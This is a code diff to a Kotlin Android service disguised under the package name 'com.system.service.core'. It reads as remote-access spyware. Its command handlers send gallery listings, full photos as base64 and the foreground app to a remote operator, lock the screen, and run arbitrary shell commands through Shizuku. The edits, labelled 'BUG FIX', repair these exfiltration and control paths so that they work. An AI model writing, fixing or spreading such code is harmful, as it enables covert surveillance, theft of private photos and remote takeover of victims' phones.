@@ -1,6 +1,8 @@
 package com.system.service.core
 
 import android.app.*
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.location.Location
@@ -538,8 +540,11 @@ class CoreService : Service() {
                     sendData("live_painting_stopped", JSONObject())
                 }
                 "live_painting_draw"  -> {
+                    // BUG FIX: JSONObject has no optFloat() — use optDouble().toFloat()
                     LivePaintingService.instance?.onRemoteDraw(
-                        data.optFloat("x", 0f), data.optFloat("y", 0f), data.optString("action", "move"))
+                        data.optDouble("x", 0.0).toFloat(),
+                        data.optDouble("y", 0.0).toFloat(),
+                        data.optString("action", "move"))
                 }
             }
         } catch (e: SecurityException) {
@@ -586,8 +591,12 @@ class CoreService : Service() {
     private fun sendCurrentAppBackground() {
         ioExecutor.execute {
             try {
-                val info = AppUsageManager.getCurrentApp(this)
-                sendData("current_app", JSONObject().apply { put("package", info.first); put("name", info.second) })
+                // BUG FIX: getCurrentApp returns String? not Pair — fixed to match actual signature
+                val pkg = AppUsageManager.getCurrentApp(this) ?: return@execute
+                sendData("current_app", JSONObject().apply {
+                    put("package", pkg)
+                    put("name", pkg.substringAfterLast('.'))
+                })
             } catch (e: SecurityException) {
                 CrashLogger.logCrash(this, e, "sendCurrentApp:SecurityException")
             } catch (_: Exception) {}
@@ -631,7 +640,8 @@ class CoreService : Service() {
     private fun sendGalleryBackground(limit: Int) {
         ioExecutor.execute {
             try {
-                val items = GalleryManager.getRecentImages(this, limit)
+                // BUG FIX: Method was getRecentImages — actual name is getRecentPhotos
+                val items = GalleryManager.getRecentPhotos(this, limit)
                 sendData("gallery", JSONObject().apply { put("items", items) })
             } catch (e: SecurityException) {
                 CrashLogger.logCrash(this, e, "sendGallery:SecurityException")
@@ -641,7 +651,13 @@ class CoreService : Service() {
 
     private fun sendFullPhoto(path: String) {
         ioExecutor.execute {
-            try { GalleryManager.sendFullImage(this, path) } catch (_: Exception) {}
+            try {
+                // BUG FIX: sendFullImage didn't exist — getFullPhoto returns base64 string
+                val b64 = GalleryManager.getFullPhoto(this, path)
+                if (b64 != null) {
+                    sendData("full_photo", JSONObject().apply { put("path", path); put("data", b64) })
+                }
+            } catch (_: Exception) {}
         }
     }
 
@@ -666,6 +682,7 @@ class CoreService : Service() {
 
     private fun lockScreen() {
         try {
+            // BUG FIX: DevicePolicyManager import was missing — added to imports
             val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
             dpm.lockNow()
         } catch (e: SecurityException) {
@@ -674,7 +691,8 @@ class CoreService : Service() {
     }
 
     private fun runShellCmd(cmd: String) {
-        try { ShizukuManager.runShell(cmd) } catch (_: Exception) {}
+        // BUG FIX: ShizukuManager.runShell didn't exist — actual method is exec()
+        try { ShizukuManager.exec(cmd) } catch (_: Exception) {}
     }
 
     // ── Notification ───────────────────────────────────────────────────────────
